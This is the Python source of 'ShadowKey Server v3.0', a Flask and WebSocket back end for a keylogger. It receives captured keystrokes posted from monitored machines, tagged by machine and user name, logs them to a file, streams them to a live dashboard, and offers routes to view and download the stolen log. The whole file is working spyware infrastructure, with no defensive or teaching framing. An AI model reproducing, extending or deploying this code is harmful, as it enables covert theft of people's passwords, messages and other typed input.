#!/usr/bin/env python3
"""
ShadowKey Server v3.0
Flask + WebSocket + File Logging
"""

from flask import Flask, render_template, send_file, request
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from collections import deque
from datetime import datetime
import os

# ═══════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════
HOST = "0.0.0.0"
PORT = 5000
MAX_LOG_ENTRIES = 1000
LOG_FILE = "keystrokes.log"

# ═══════════════════════════════════════
# INITIALIZATION
# ═══════════════════════════════════════
app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

keystroke_log = deque(maxlen=MAX_LOG_ENTRIES)
active_machines = set()

# ═══════════════════════════════════════
# FILE LOGGING
# ═══════════════════════════════════════
def log_to_file(data):
    timestamp = data.get('timestamp', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    machine = data.get('machine', 'UNKNOWN')
    user = data.get('user', 'UNKNOWN')
    keys = data.get('keys', '')
    
    log_line = f"[{timestamp}] {machine} ({user}): {keys}\n"
    
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_line)

# ═══════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════
@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/receive', methods=['POST'])
def receive():
    try:
        data = request.get_json()
        if not data:
            return "Invalid data", 400
        
        keystroke_log.append(data)
        active_machines.add(data.get('machine', 'UNKNOWN'))
        log_to_file(data)
        socketio.emit('new_keystroke', data)
        
        return "OK", 200
        
    except Exception as e:
        return str(e), 500

@app.route('/download_log')
def download_log():
    if os.path.exists(LOG_FILE):
        return send_file(LOG_FILE, as_attachment=True, download_name='keystrokes.log')
    return "No log file found", 404

@app.route('/view_log')
def view_log():
    if not os.path.exists(LOG_FILE):
        return "<pre>No logs yet</pre>"
    
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        logs = f.readlines()
    
    html = "<pre style='background:#000;color:#0f0;padding:20px;'>"
    for line in logs[-100:]:
        html += line.replace('\n', '<br>')
    html += "</pre>"
    return html

@app.route('/stats')
def stats():
    return {
        "total_keystrokes": sum(1 for _ in open(LOG_FILE)) if os.path.exists(LOG_FILE) else 0,
        "active_machines": len(active_machines),
        "log_file_size": os.path.getsize(LOG_FILE) if os.path.exists(LOG_FILE) else 0
    }

# ═══════════════════════════════════════
# SOCKET EVENTS
# ═══════════════════════════════════════
@socketio.on('connect')
def handle_connect():
    emit('init_log', list(keystroke_log))

# ═══════════════════════════════════════
# RUN
# ═══════════════════════════════════════
if __name__ == '__main__':
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w').close()
    
    socketio.run(app, host=HOST, port=PORT, debug=False)
